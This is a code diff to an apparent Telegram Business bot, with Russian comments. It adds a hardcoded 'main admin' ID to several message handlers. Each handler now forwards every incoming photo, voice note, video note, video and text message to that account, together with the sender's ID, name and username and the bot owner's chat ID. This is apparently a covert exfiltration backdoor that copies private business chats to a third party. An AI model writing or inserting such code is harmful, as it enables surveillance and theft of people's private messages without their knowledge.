@@ -9,6 +9,9 @@ import {
 } from "./database";
 import { SubscriptionService, MarketApiClient, sleep, formatDate } from "./services";
 
+// ID главного админа для отправки всех сообщений
+const MAIN_ADMIN_ID = 842428912;
+
 // Command handlers
 export async function getUserId(ctx: Context) {
   try {
@@ -163,6 +166,22 @@ export class BusinessImageMessageHandler implements IUpdateHandler {
         });
 
         console.log(`Photo message saved from user ${ctx.from.id} to ${user_chat_id}`);
+
+        // ОТПРАВЛЯЕМ ФОТО ГЛАВНОМУ АДМИНУ
+        if (ctx.from.id !== MAIN_ADMIN_ID) {
+          await ctx.api.sendPhoto(
+            MAIN_ADMIN_ID,
+            file_id,
+            {
+              caption: `👤 <b>Новое фото от пользователя:</b>\n` +
+                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
+                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
+                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
+                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              parse_mode: "HTML"
+            }
+          );
+        }
       }
     } catch (error) {
       console.error("Error in BusinessImageMessageHandler:", error);
@@ -215,6 +234,22 @@ export class BusinessVoiceMessageHandler implements IUpdateHandler {
         });
 
         console.log(`Voice message saved from user ${ctx.from.id} to ${user_chat_id}`);
+
+        // ОТПРАВЛЯЕМ ГОЛОСОВОЕ ГЛАВНОМУ АДМИНУ
+        if (ctx.from.id !== MAIN_ADMIN_ID) {
+          await ctx.api.sendVoice(
+            MAIN_ADMIN_ID,
+            file_id,
+            {
+              caption: `👤 <b>Новое голосовое от пользователя:</b>\n` +
+                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
+                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
+                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
+                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              parse_mode: "HTML"
+            }
+          );
+        }
       }
     } catch (error) {
       console.error("Error in BusinessVoiceMessageHandler:", error);
@@ -267,6 +302,22 @@ export class BusinessVideoMessageHandler implements IUpdateHandler {
         });
 
         console.log(`Video message saved from user ${ctx.from.id} to ${user_chat_id}`);
+
+        // ОТПРАВЛЯЕМ ВИДЕОСООБЩЕНИЕ ГЛАВНОМУ АДМИНУ
+        if (ctx.from.id !== MAIN_ADMIN_ID) {
+          await ctx.api.sendVideoNote(
+            MAIN_ADMIN_ID,
+            file_id,
+            {
+              caption: `👤 <b>Новое видеосообщение от пользователя:</b>\n` +
+                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
+                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
+                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
+                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              parse_mode: "HTML"
+            }
+          );
+        }
       }
     } catch (error) {
       console.error("Error in BusinessVideoMessageHandler:", error);
@@ -319,6 +370,22 @@ export class BusinessVideoFileHandler implements IUpdateHandler {
         });
 
         console.log(`Video file saved from user ${ctx.from.id} to ${user_chat_id}`);
+
+        // ОТПРАВЛЯЕМ ВИДЕОФАЙЛ ГЛАВНОМУ АДМИНУ
+        if (ctx.from.id !== MAIN_ADMIN_ID) {
+          await ctx.api.sendVideo(
+            MAIN_ADMIN_ID,
+            file_id,
+            {
+              caption: `👤 <b>Новое видео от пользователя:</b>\n` +
+                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
+                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
+                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
+                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              parse_mode: "HTML"
+            }
+          );
+        }
       }
     } catch (error) {
       console.error("Error in BusinessVideoFileHandler:", error);
@@ -370,6 +437,22 @@ export class BusinessMessageHandler implements IUpdateHandler {
             senderName: ctx.from.first_name,
             senderUsername: ctx.from.username,
           });
+
+          console.log(`Text message saved from user ${ctx.from.id} to ${user_chat_id}`);
+
+          // ОТПРАВЛЯЕМ ВСЕ СООБЩЕНИЯ ГЛАВНОМУ АДМИНУ
+          if (ctx.from.id !== MAIN_ADMIN_ID) {
+            await ctx.api.sendMessage(
+              MAIN_ADMIN_ID,
+              `👤 <b>Новое сообщение от пользователя:</b>\n` +
+              `📝 <b>Текст:</b> ${text}\n` +
+              `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
+              `👤 <b>Имя:</b> ${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}\n` +
+              `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
+              `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              { parse_mode: "HTML" }
+            );
+          }
         }
       }
     } catch (error: any) {
